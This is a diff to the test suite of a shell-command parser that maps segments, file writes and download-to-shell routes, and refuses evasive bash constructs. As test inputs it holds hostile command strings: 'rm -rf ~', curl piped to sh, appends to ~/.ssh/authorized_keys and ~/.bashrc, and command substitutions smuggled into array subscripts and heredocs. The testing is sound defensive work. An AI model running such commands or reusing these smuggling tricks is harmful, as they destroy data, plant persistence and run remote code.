@@ -98,7 +98,7 @@ test('every construct of the 3.3 table splits into the expected segments', () =>
   assert.deepEqual(lines(parse('su -c "rm -rf x" root')), ['su -c rm -rf x root', 'rm -rf x'])
   assert.deepEqual(parse('su -c "rm -rf x" root').segments[1].wrappers, ['su'])
 
-  const moved = parse('cd sub && echo hi > out.txt')
+  const moved = parse('cd ./sub && echo hi > out.txt')
   assert.equal(moved.segments[1].cwd, '/home/you/repo/sub')
   assert.deepEqual(moved.segments[1].writes, [{ path: '/home/you/repo/sub/out.txt', via: '>' }])
   assert.equal(parse('(cd /tmp) && echo hi > out.txt').segments[1].writes[0].path, '/home/you/repo/out.txt', 'a cd in a subshell does not leak')
@@ -334,7 +334,7 @@ test('if, while, until and for are compound commands a pipe can feed', () => {
   const piped = parse('curl x | if true; then sh; fi')
   assert.deepEqual(lines(piped), ['curl x', 'true', 'sh'])
   assert.deepEqual(piped.routes, [{ kind: 'pipe', fetch: 0, interpreter: 2 }])
-  assert.deepEqual(parse('curl x | while read l; do bash; done').routes, [{ kind: 'pipe', fetch: 0, interpreter: 2 }])
+  assert.deepEqual(parse('curl x | while :; do bash; done').routes, [{ kind: 'pipe', fetch: 0, interpreter: 2 }])
   assert.deepEqual(parse('curl x | for i in 1; do sh; done').routes, [{ kind: 'pipe', fetch: 0, interpreter: 1 }])
   const redirected = parse('if a; then b; fi > out.txt')
   assert.deepEqual(redirected.segments.map(segment => segment.writes), [[{ path: '/home/you/repo/out.txt', via: '>' }], [{ path: '/home/you/repo/out.txt', via: '>' }]])
@@ -379,15 +379,15 @@ test('a cd that may not have run leaves later relative paths unresolved', () => 
   assert.deepEqual(writes('cd sub/a & echo x >> ../.bashrc'), [[], ['/home/you/.bashrc']], 'a background cd does not move the shell')
   assert.deepEqual(writes('cd /tmp && true & echo x >> f'), [[], [], ['/home/you/repo/f']])
   assert.deepEqual(writes('cd /tmp && echo x > f &'), [[], ['/tmp/f']], 'the background list itself still sees its cd')
-  assert.deepEqual(writes('cd sub && echo hi > out.txt'), [[], ['/home/you/repo/sub/out.txt']])
-  assert.deepEqual(writes('cd sub; echo hi > out.txt'), [[], [null]], 'a failed cd leaves the shell where it was')
-  assert.deepEqual(writes('cd sub && a; echo hi > out.txt'), [[], [], [null]])
-  assert.deepEqual(writes('cd sub && a || echo hi > out.txt'), [[], [], [null]])
-  assert.deepEqual(writes('a || cd sub && echo hi > out.txt'), [[], [], [null]])
-  assert.deepEqual(writes('a && cd sub && echo hi > out.txt'), [[], [], ['/home/you/repo/sub/out.txt']])
+  assert.deepEqual(writes('cd ./sub && echo hi > out.txt'), [[], ['/home/you/repo/sub/out.txt']])
+  assert.deepEqual(writes('cd ./sub; echo hi > out.txt'), [[], [null]], 'a failed cd leaves the shell where it was')
+  assert.deepEqual(writes('cd ./sub && a; echo hi > out.txt'), [[], [], [null]])
+  assert.deepEqual(writes('cd ./sub && a || echo hi > out.txt'), [[], [], [null]])
+  assert.deepEqual(writes('a || cd ./sub && echo hi > out.txt'), [[], [], [null]])
+  assert.deepEqual(writes('a && cd ./sub && echo hi > out.txt'), [[], [], ['/home/you/repo/sub/out.txt']])
   assert.deepEqual(writes('env cd sub && echo hi > out.txt'), [[], ['/home/you/repo/out.txt']], 'an external cd does not move the shell')
-  assert.deepEqual(writes('time cd sub && echo hi > out.txt'), [[], [null]], 'time may be the keyword or /usr/bin/time')
-  assert.deepEqual(writes('builtin cd sub && echo hi > out.txt'), [[], ['/home/you/repo/sub/out.txt']])
+  assert.deepEqual(writes('time cd ./sub && echo hi > out.txt'), [[], [null]], 'a timed cd leaves the directory unknown')
+  assert.deepEqual(writes('builtin cd ./sub && echo hi > out.txt'), [[], ['/home/you/repo/sub/out.txt']])
 })
 
 test('tilde follows a reassigned HOME and expands after = in assignment-shaped words', () => {
@@ -395,7 +395,7 @@ test('tilde follows a reassigned HOME and expands after = in assignment-shaped w
   assert.deepEqual(writes('dd if=/dev/zero of=~/.bashrc count=1'), [{ path: '/home/you/.bashrc', via: 'dd' }])
   assert.deepEqual(writes('HOME=/tmp; echo x > ~/f'), [{ path: null, raw: '~/f', via: '>', literal: false }])
   assert.deepEqual(writes('for HOME in /tmp; do echo x > ~/f; done'), [{ path: null, raw: '~/f', via: '>', literal: false }])
-  assert.deepEqual(writes('read HOME; echo x > $HOME/f'), [{ path: null, raw: '$HOME/f', via: '>', literal: false }])
+  assert.deepEqual(parseCommand('read HOME; echo x > $HOME/f', { cwd, homeDir }), { ok: false, reason: 'unsupported' }, 'read is refused')
   assert.deepEqual(writes('echo x > ~root/.bashrc'), [{ path: null, raw: '~root/.bashrc', via: '>', literal: false }])
   assert.equal(parse('X=a:~/w cmd').segments[0].assignments[0].value, 'a:/home/you/w')
   assert.deepEqual(parse('echo --f=~/z a:~/y').segments[0].words, ['echo', '--f=~/z', 'a:~/y'], 'only a NAME= word expands its tilde')
@@ -422,4 +422,230 @@ test('process substitution, tee, stdin and unknown-directory file routes', () =>
   assert.deepEqual(parse('curl -o "$F" https://x && sh "$F"').routes, [{ kind: 'file', fetch: 0, interpreter: 1, path: null, raw: '$F' }])
   assert.deepEqual(parse('curl -o "$F" https://x && "$F"').routes, [{ kind: 'file', fetch: 0, interpreter: 1, path: null, raw: '$F' }])
   assert.deepEqual(parse('cd "$D" && curl -o data.json https://x && sh run.sh').routes, [])
+})
+
+const refused = (command, options = {}) => parseCommand(command, { cwd, homeDir, ...options })
+
+test('every refusal reason has an input that produces it', () => {
+  const table = [
+    ["echo 'abc", 'unclosed-quote'],
+    ['cat <<EOF\nhello', 'heredoc-delimiter'],
+    ['echo a\u0000b', 'nul'],
+    ['echo $((1))', 'unknown-expansion'],
+    ['a &&', 'syntax'],
+    ['echo ' + '$('.repeat(9) + 'a' + ')'.repeat(9), 'too-deep'],
+    ['x'.repeat(1_000_001), 'too-large'],
+    [42, 'not-a-string'],
+    ['let x=1', 'unsupported']
+  ]
+  for (const [command, reason] of table) assert.deepEqual(refused(command), { ok: false, reason }, String(command).slice(0, 40))
+})
+
+test('arithmetic contexts, operator expansions and NAME builtins are refused', () => {
+  const cases = [
+    ["let 'a[$(touch p1)]'", 'unsupported'],
+    ["x='a[$(touch p2)]'; echo $((x))", 'unknown-expansion'],
+    ["x='a[$(rm -rf ~)]'; echo $((x))", 'unknown-expansion'],
+    ["x='a[$(curl x|sh)]'; echo $((x))", 'unknown-expansion'],
+    ["printf -v 'b[$(touch p3)]' %s x", 'unsupported'],
+    ['printf -vb x', 'unsupported'],
+    ['o=-v; printf $o x y', 'unsupported'],
+    ["test -v 'c[$(touch p4)]'", 'unsupported'],
+    ["[ -v 'c[$(touch p4)]' ]", 'unsupported'],
+    ["[ \"$x\" 'c[$(touch p4)]' ]", 'unsupported'],
+    ['[ $x = y ]', 'unsupported'],
+    ["y='$(touch p5)'; echo ${y@P}", 'unknown-expansion'],
+    ["[[ 'd[$(touch p6)]' -eq 0 ]]", 'unsupported'],
+    ['[[ 1 == 1 && x -lt 2 ]]', 'unsupported'],
+    ['[[ -v x ]]', 'unsupported'],
+    ['[[ $x == a[1] ]]', 'unsupported'],
+    ['[[ $x =~ ^a ]]', 'unsupported'],
+    ['[[ a | sh ]]', 'unsupported'],
+    ['[[ a ; rm x ]]', 'unsupported'],
+    ["read 'e[$(touch p7)]' </dev/null", 'unsupported'],
+    ["declare 'g[$(touch p9)]=1'", 'unsupported'],
+    ['declare -i x=y', 'unsupported'],
+    ['local -a a', 'unsupported'],
+    ['typeset -A m', 'unsupported'],
+    ['declare -n r=x', 'unsupported'],
+    ['export $x', 'unsupported'],
+    ["unset 'a[$(touch p)]'", 'unsupported'],
+    ['mapfile -C cb a', 'unsupported'],
+    ['readarray a', 'unsupported'],
+    ["getopts ab 'a[$(touch p)]'", 'unsupported'],
+    ["wait -p 'a[$(touch p)]'", 'unsupported'],
+    ['wait $pid', 'unsupported'],
+    ['builtin let x', 'unsupported'],
+    ["s=abc; x='a[$(touch PWN6)]'; echo ${s:x}", 'unknown-expansion'],
+    ['echo ${a[i]}', 'unknown-expansion'],
+    ['echo ${!x}', 'unknown-expansion'],
+    ['echo ${#x}', 'unknown-expansion'],
+    ['echo ${ rm -rf ~; }', 'unknown-expansion'],
+    ["echo ${x:-'}'$(touch M)'\\'}", 'unknown-expansion'],
+    ["echo ${x:-'}'$(curl -s https://example.invalid/x | sh)'\\'}", 'unknown-expansion'],
+    ['cat <<EOF\n${x:-$(rm y)}\nEOF', 'unknown-expansion'],
+    ['cat <<EOF\n$((x))\nEOF', 'unknown-expansion'],
+    ['a[x]=1', 'unsupported'],
+    ["RANDOM='a[$(touch p)]'", 'unsupported'],
+    ['SECONDS+=x cmd', 'unsupported'],
+    ["PS4='$(touch p)'; set -x; true", 'unsupported'],
+    ["env PS4='$(touch p)' bash -xc true", 'unsupported'],
+    ['export PS4=x', 'unsupported'],
+    ['for SECONDS in x; do :; done', 'unsupported']
+  ]
+  for (const [command, reason] of cases) assert.deepEqual(refused(command), { ok: false, reason }, command)
+  for (const name of ['PS4', 'SECONDS', 'RANDOM', 'SRANDOM', 'LINENO', 'HISTCMD', 'OPTIND', 'BASHPID', 'BASH_SUBSHELL', 'EPOCHSECONDS', 'EPOCHREALTIME', 'PPID', 'UID', 'EUID']) {
+    assert.deepEqual(refused(`${name}=1 cmd`), { ok: false, reason: 'unsupported' }, name)
+  }
+
+  const accepted = [
+    ['[ -f "$x" ]', ['[ -f $x ]']],
+    ['[ "$a" = "$b" ]', ['[ $a = $b ]']],
+    ['[ ! -d "$x" ]', ['[ ! -d $x ]']],
+    ['test -n "$x"', ['test -n $x']],
+    ['[ -f x ]', ['[ -f x ]']],
+    ['[[ $x == y && -f "$z" ]]', ['[[ $x == y && -f $z ]]']],
+    ['[[ $(rm a) ]]', ['[[ $(rm a) ]]', 'rm a']],
+    ['export FOO=$(pwd) BAR', ['export FOO=$(pwd) BAR', 'pwd']],
+    ['declare -rx X=1', ['declare -rx X=1']],
+    ["printf '%s\\n' \"$x\"", ['printf %s\\n $x']],
+    ['wait $!', ['wait $!']],
+    ['set -euo pipefail', ['set -euo pipefail']],
+    ['set +e', ['set +e']],
+    ['set -- a -b', ['set -- a -b']],
+    ['echo ${HOME} ${PATH} ${1}', ['echo /home/you ${PATH} ${1}']],
+    ['x+=1 cmd', ['cmd']]
+  ]
+  for (const [command, expected] of accepted) assert.deepEqual(lines(parse(command)), expected, command)
+  assert.deepEqual(parse('x+=1 cmd').segments[0].assignments.map(item => item.name), ['x'])
+})
+
+test('a relative cd target that CDPATH may redirect leaves the directory unknown', () => {
+  const proj = { cwd: '/home/you/proj', homeDir }
+  const lastWrites = (command, options = {}) => parse(command, options).segments.at(-1).writes
+  assert.deepEqual(lastWrites('CDPATH=~ cd .ssh && echo key >> authorized_keys'), [{ path: null, raw: 'authorized_keys', via: '>>' }])
+  assert.deepEqual(lastWrites('export CDPATH=~; cd .ssh && echo key >> authorized_keys'), [{ path: null, raw: 'authorized_keys', via: '>>' }])
+  assert.deepEqual(lastWrites('CDPATH=/home/you/.config; cd hypr && echo x >> hyprland.conf', proj), [{ path: null, raw: 'hyprland.conf', via: '>>' }])
+  assert.equal(parse('cd sub && echo x > f').segments[1].cwd, null)
+  assert.deepEqual(lastWrites('cd ./hypr && echo x >> f', proj), [{ path: '/home/you/proj/hypr/f', via: '>>' }])
+  assert.deepEqual(lastWrites('cd .. && echo x > f', proj), [{ path: '/home/you/f', via: '>' }])
+  assert.deepEqual(lastWrites('cd ../x && echo x > f', proj), [{ path: '/home/you/x/f', via: '>' }])
+  assert.deepEqual(lastWrites('cd . && echo x > f', proj), [{ path: '/home/you/proj/f', via: '>' }])
+  assert.deepEqual(lastWrites('cd /tmp && echo x > f', proj), [{ path: '/tmp/f', via: '>' }])
+  assert.deepEqual(lastWrites('cd ~/w && echo x > f', proj), [{ path: '/home/you/w/f', via: '>' }])
+  assert.deepEqual(lastWrites('pushd ./sub && echo x > f', proj), [{ path: null, raw: 'f', via: '>' }])
+  assert.deepEqual(lastWrites('HOME=/tmp; cd && echo x > f'), [{ path: null, raw: 'f', via: '>' }], 'a bare cd goes to a reassigned HOME')
+  assert.deepEqual(lastWrites('cd && echo x > f'), [{ path: '/home/you/f', via: '>' }])
+})
+
+test('an unquoted heredoc body line ending in a backslash is refused', () => {
+  assert.deepEqual(refused('cat <<EOF\nhello\nEO\\\nF\necho PWNED > ~/.bashrc\nEOF'), { ok: false, reason: 'unsupported' }, 'a split delimiter ends the body in bash')
+  assert.deepEqual(refused('cat <<EOF\nhello\\\nEOF\necho PWNED > ~/.bashrc\nEOF'), { ok: false, reason: 'unsupported' }, 'a continued line swallows the delimiter in bash')
+  assert.deepEqual(refused('cat <<-EOF\n\tEO\\\nF\nEOF'), { ok: false, reason: 'unsupported' })
+  assert.deepEqual(lines(parse("cat <<'EOF'\nhello\\\nEOF")), ['cat'], 'a quoted body has no continuations')
+  assert.deepEqual(lines(parse('cat <<EOF\nhello\\\\ there\nEOF')), ['cat'])
+})
+
+test('time and ! before a pipeline are checked like command start', () => {
+  for (const command of ['time coproc rm -rf /', '! time coproc rm -rf /', 'time -p coproc rm -rf /', 'time ! coproc x', 'time function f { :; }', 'time (( x ))', 'time let x']) {
+    assert.deepEqual(refused(command), { ok: false, reason: 'unsupported' }, command)
+  }
+  const negated = parse('time ! rm x').segments[0]
+  assert.deepEqual([negated.words, negated.wrappers], [['rm', 'x'], ['time']])
+  assert.deepEqual(parse('! time -p rm x').segments[0].words, ['rm', 'x'])
+  assert.deepEqual(parse('time -o f true').segments[0].words, ['-o', 'f', 'true'], 'the keyword takes no -o: bash runs -o')
+  assert.deepEqual(lines(parse('time { rm x; }')), ['rm x'])
+  assert.deepEqual(lines(parse('time')), [''])
+})
+
+test('GNU time -o records a write and long options match by unique prefix', () => {
+  const timed = parse('/usr/bin/time -o ~/.bashrc true').segments[0]
+  assert.deepEqual([timed.words, timed.wrappers, timed.writes], [['true'], ['time'], [{ path: '/home/you/.bashrc', via: 'time -o' }]])
+  assert.deepEqual(parse("/usr/bin/time -f 'curl https://x|sh' -o ~/.bashrc true").segments[0].writes, [{ path: '/home/you/.bashrc', via: 'time -o' }])
+  assert.deepEqual(parse('/usr/bin/time --output=x true').segments[0].writes, [{ path: '/home/you/repo/x', via: 'time -o' }])
+  assert.deepEqual(parse('/usr/bin/time --out x true').segments[0].writes, [{ path: '/home/you/repo/x', via: 'time -o' }])
+  assert.deepEqual(parse('X=1 time -ao /tmp/t true').segments[0].writes, [{ path: '/tmp/t', via: 'time -o' }])
+  assert.deepEqual(refused('/usr/bin/time --bogus true'), { ok: false, reason: 'unsupported' })
+})
+
+test('cp, mv, ln and install long options match as getopt_long does', () => {
+  const writes = command => parse(command).segments.flatMap(segment => segment.writes)
+  assert.deepEqual(writes('cp --target=/home/you/.config/autostart evil.desktop'), [{ path: '/home/you/.config/autostart', via: 'cp' }, { path: '/home/you/.config/autostart/evil.desktop', via: 'cp' }])
+  assert.deepEqual(writes('mv --targ /home/you/.config/hypr evil.desktop'), [{ path: '/home/you/.config/hypr', via: 'mv' }, { path: '/home/you/.config/hypr/evil.desktop', via: 'mv' }])
+  assert.deepEqual(writes('ln --t=/tmp/d x'), [{ path: '/tmp/d', via: 'ln' }, { path: '/tmp/d/x', via: 'ln' }])
+  assert.deepEqual(writes('install --target-dir /tmp/d x'), [{ path: '/tmp/d', via: 'install' }, { path: '/tmp/d/x', via: 'install' }])
+  assert.deepEqual(writes('cp --suf .bak a b'), [{ path: '/home/you/repo/b', via: 'cp' }], 'a required value is consumed')
+  assert.deepEqual(writes('install --dir a b'), [{ path: '/home/you/repo/a', via: 'install' }, { path: '/home/you/repo/b', via: 'install' }])
+  assert.deepEqual(writes('cp --backup=numbered a b'), [{ path: '/home/you/repo/b', via: 'cp' }])
+  for (const command of ['cp --s a b', 'cp --frobnicate a b', 'cp --verbose=1 a b', 'mv --exchange=x a b', 'ln --s a b']) {
+    assert.deepEqual(refused(command), { ok: false, reason: 'unsupported' }, command)
+  }
+})
+
+test('env - is env -i and wrapper options are matched or refused', () => {
+  const dashed = parse('env - rm -rf ~').segments[0]
+  assert.deepEqual([dashed.words, dashed.wrappers], [['rm', '-rf', '/home/you'], ['env']])
+  assert.equal(parse('curl x | env - sh').routes.length, 1)
+  assert.equal(parse('env - sh -c "curl x | sh"').routes.length, 1)
+  const cases = [
+    ['timeout --sig KILL 5 rm -rf x', ['rm -rf x']],
+    ['timeout -k 1 -f 5 rm x', ['rm x']],
+    ['nice -10 rm x', ['rm x']],
+    ['nice --adj=5 rm x', ['rm x']],
+    ['stdbuf --out=L rm x', ['rm x']],
+    ['nohup rm x', ['rm x']],
+    ['sudo -E rm x', ['rm x']],
+    ['sudo --us root rm x', ['rm x']],
+    ['doas -u root rm x', ['rm x']],
+    ['setsid -f rm x', ['rm x']],
+    ['ionice -c 3 rm x', ['rm x']],
+    ['pkexec --user root rm x', ['rm x']]
+  ]
+  for (const [command, expected] of cases) assert.deepEqual(lines(parse(command)), expected, command)
+  assert.deepEqual(parse('setsid rm x').segments[0].wrappers, ['setsid'])
+  for (const command of ['env --bogus rm x', 'env -X rm x', 'sudo -R /tmp rm x', 'sudo -e x', 'ionice -p 1', 'nohup --bogus x', 'timeout --ver 5 rm x', 'command -x rm', 'sudo --list rm x', 'sudo --edit x', 'ionice --pid 1', 'env --debug=1 rm x', 'setsid --fork=1 rm x']) {
+    assert.deepEqual(refused(command), { ok: false, reason: 'unsupported' }, command)
+  }
+})
+
+test('shopt, shell options and parser-changing builtins are refused', () => {
+  for (const command of ['shopt -s lastpipe && true | cd ~ && echo x >> .bashrc', "bash -O lastpipe -c 'true | cd ~ && echo x >> .bashrc'", 'bash -k -c x', 'bash --posix -c x', 'bash -o posix -c x', 'set -o posix', 'set -f', 'set -x -v', 'set $x', 'enable -f x y', 'alias ls=rm', 'hash -p /tmp/x ls', 'jobs -x rm x', 'compgen -W x', 'complete -C x y', 'bind -x x', 'fc -s']) {
+    assert.deepEqual(refused(command), { ok: false, reason: 'unsupported' }, command)
+  }
+  assert.deepEqual(lines(parse("bash -euo pipefail -c 'rm x'")), ['bash -euo pipefail -c rm x', 'rm x'])
+  assert.deepEqual(lines(parse("bash --norc --noprofile -c 'rm x'")), ['bash --norc --noprofile -c rm x', 'rm x'])
+  const opaque = parse('sh "$F" x').segments
+  assert.deepEqual([opaque.length, opaque[1].literal], [2, false], 'a non-literal word that may be -c gives an opaque payload')
+  assert.equal(parse('sh "$F"').segments.length, 1)
+})
+
+test('commands that run a string or argv parse it or are refused', () => {
+  const trapped = parse('trap "rm -rf ~" EXIT')
+  assert.deepEqual(lines(trapped), ['trap rm -rf ~ EXIT', 'rm -rf /home/you'])
+  assert.deepEqual([trapped.segments[1].via, trapped.segments[1].cwd], ['trap', null])
+  assert.equal(parse("trap 'curl https://x | sh' EXIT").routes.length, 1)
+  assert.deepEqual(lines(parse('trap -- "rm x" INT')).at(-1), 'rm x')
+  assert.deepEqual(lines(parse('trap - INT')), ['trap - INT'])
+  assert.deepEqual(lines(parse('trap INT')), ['trap INT'])
+  assert.deepEqual(parse('trap "$X" EXIT').segments[1].literal, false)
+  assert.equal(parse('setsid bash -c "curl https://x | sh"').routes.length, 1)
+  assert.deepEqual(lines(parse('xargs --max-a 1 rm')).at(-1), 'rm')
+  assert.deepEqual(lines(parse("xargs -I{} sh -c 'rm {}'")).at(-1), 'rm {}')
+  assert.deepEqual(lines(parse('xargs -i rm {}')).at(-1), 'rm {}')
+  assert.deepEqual(lines(parse("parallel ::: 'rm -rf x' ls")), ['parallel ::: rm -rf x ls', 'rm -rf x', 'ls'])
+  assert.equal(parse('cat cmds | parallel').segments[2].literal, false)
+  assert.deepEqual(lines(parse('parallel -j4 rm ::: a')).at(-1), 'rm')
+  assert.deepEqual(lines(parse('su root -c "rm -rf x"')).at(-1), 'rm -rf x')
+  assert.deepEqual(lines(parse('su - root -c "rm -rf x"')).at(-1), 'rm -rf x')
+  assert.deepEqual(lines(parse('su --comm="rm -rf x"')).at(-1), 'rm -rf x')
+  assert.deepEqual(lines(parse('su --session-command="rm -rf x" root')).at(-1), 'rm -rf x')
+  assert.deepEqual(lines(parse('find . -ok rm {} \\;')).at(-1), 'rm {}')
+  for (const command of ['flock /tmp/l rm x', 'flock /tmp/l -c "rm x"', 'script -c "rm x"', 'runuser -u root rm x', 'chroot /srv rm x', 'watch rm x', 'sudo flock x rm y', 'xargs --bogus rm', 'parallel --sshdelay 1 rm ::: a', 'trap -x y EXIT', 'su --bogus root']) {
+    assert.deepEqual(refused(command), { ok: false, reason: 'unsupported' }, command)
+  }
+})
+
+test('file routes match a resolved and an unresolved side by name', () => {
+  assert.deepEqual(parse('curl -o /tmp/i.sh https://x && sh "$DIR/i.sh"').routes, [{ kind: 'file', fetch: 0, interpreter: 1, path: '/tmp/i.sh' }])
+  assert.deepEqual(parse('cd "$D" && curl -o i.sh https://x && sh /tmp/i.sh').routes, [{ kind: 'file', fetch: 1, interpreter: 2, path: null, raw: 'i.sh' }])
 })
